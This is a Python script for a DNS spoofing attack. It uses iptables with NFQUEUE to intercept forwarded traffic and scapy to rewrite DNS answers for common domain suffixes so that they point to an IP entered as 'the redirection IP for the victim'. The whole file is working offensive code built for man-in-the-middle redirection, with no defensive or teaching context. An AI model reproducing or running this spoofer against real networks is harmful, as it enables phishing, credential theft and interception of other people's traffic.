import netfilterqueue
import scapy.all as scapy
import subprocess
from termcolor import colored
def deleting_packets_variables(s):
    del s[scapy.IP].len
    del s[scapy.IP].chksum
    del s[scapy.UDP].chksum
    del s[scapy.UDP].len
def process_packet(packet):
    s = scapy.IP(packet.get_payload())
    if s.haslayer(scapy.DNSRR):
        qname = s[scapy.DNSQR].qname
        domains = [b".com",b".edu" , b".co" , b".ac.in",b".in"]
        for domain in domains:
            if domain in qname:
                print(colored("\t\t\t\t\t\t....[+]Spoofing target...[+]...." , "red" , "on_yellow"))
                fake_DNSRR = scapy.DNSRR(rrname=qname ,rdata=ip)
                s[scapy.DNS].an = fake_DNSRR
                s[scapy.DNS].ancount = 1

                deleting_packets_variables(s)
                packet.set_payload(bytes(s))

    packet.accept()


def iptables():
    #subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", stdout=subprocess.DEVNULL, shell=True)
    #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", stdout=subprocess.DEVNULL , shell=True)
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0" , stdout=subprocess.DEVNULL , shell=True)
    print(colored("[+]iptables changed[+]" , "red" , attrs=["bold" , "underline" , "reverse"]))
def dns_spoof():
    iptables()
    try:
        q = netfilterqueue.NetfilterQueue()
        q.bind(0 , process_packet)
        q.run()

    except KeyboardInterrupt:
        subprocess.call("iptables --flush", stdout=subprocess.DEVNULL , shell=True)
        print(colored("[+]iptables flushed[+]", "green"))

def start():
    global ip
    ip = input("\nENTER THE REDIRECTION IP FOR THE VICTIM : ")
    dns_spoof()
